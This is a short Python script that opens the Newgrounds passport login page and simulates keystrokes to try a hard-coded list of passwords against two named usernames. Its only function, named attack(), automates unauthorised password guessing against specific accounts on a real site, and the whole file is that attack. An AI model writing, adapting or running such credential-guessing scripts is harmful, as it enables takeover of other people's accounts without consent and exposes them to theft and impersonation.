import keyboard as key
import webbrowser as browser
import time

http = 'https://'
link = 'newgrounds.com/passport'
username = ['RealRoblominmus','Roblominmus']
passwords = ['ttbtl','tri-kyl.','tr1-kyl.']

def attack():
    browser.open(http+link)
    time.sleep(5)
    key.press_and_release('f6')
    time.sleep(5)
    key.press_and_release('enter')
    time.sleep(1)
    for name in username:
        key.press_and_release('tab')
        key.write(name)
        count = 1
        time.sleep(5)
        for i in passwords:
            if count == 1:
                key.press('tab')
                time.sleep(1)
                key.write(i)
                time.sleep(1)
                key.press_and_release('enter')
                time.sleep(2)
                count += 1
            if count > 1:
                key.press('tab')
                key.press('tab')
                time.sleep(1)
                key.write(i)
                time.sleep(1)
                key.press_and_release('enter')



attack()